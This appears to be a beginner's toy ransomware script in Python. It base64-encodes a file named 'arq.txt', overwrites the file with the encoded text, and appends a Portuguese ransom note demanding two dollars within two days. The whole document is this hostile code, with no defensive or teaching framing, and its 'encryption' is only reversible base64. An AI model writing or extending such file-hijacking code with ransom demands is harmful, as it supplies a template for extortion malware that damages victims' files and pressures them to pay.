import base64

with open('arq.txt', 'rb') as arquivo:
    leitura = arquivo.read()
    encode = base64.b64encode(leitura)
    remvb = encode.decode("utf-8")
    
with open('arq.txt', 'w') as novo:
   novo.write(remvb)
   novo.write('\nHASKIADO , PAGUE O RESGATE DO ARQUIVO')
   novo.write('\nAPENAS EM DOLAR , VALOR $2')
   novo.write('\nTEM APENAS DOIS DIAS')